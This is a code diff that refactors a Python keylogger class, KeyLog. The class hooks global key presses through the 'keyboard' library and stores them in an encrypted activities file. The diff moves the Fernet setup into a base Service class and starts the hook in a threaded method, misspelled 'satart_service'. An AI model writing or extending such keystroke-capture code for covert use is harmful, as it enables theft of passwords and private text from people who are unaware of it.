@@ -1,5 +1,4 @@
-from program.service import Service
-from cryptography.fernet import Fernet
+from program.service import Service, threaded
 from datetime import datetime
 import keyboard
 import pytz
@@ -8,21 +7,20 @@ class KeyLog(Service):
     def __init__(
                 self,
                 base_dir='log',
-                key=None,
+                fernet=None,
                 file_name='Activities.txt'):
         '''
         args:
             base_dir: Directory where the input or output files will be stored
             key: Secret Key for encryption and decryption
         '''
-        super().__init__(base_dir, key, file_name)
+        super().__init__(
+            base_dir=base_dir,
+            fernet=fernet,
+            file_name=file_name)
+        
         self.jumps = ["space", "enter", "return", "delete"]
         self.text = []
-        self.fernet = Fernet(self.key)
-
-        keyboard.on_press(self.key_pressed)
-        keyboard.wait()
-
 
     def key_pressed(self, event):
         '''
@@ -53,3 +51,9 @@ class KeyLog(Service):
             else:
                 # Append key in {text} array
                 self.text.append(event.name)
+
+    
+    @threaded
+    def satart_service(self):
+        keyboard.on_press(self.key_pressed)
+        keyboard.wait()
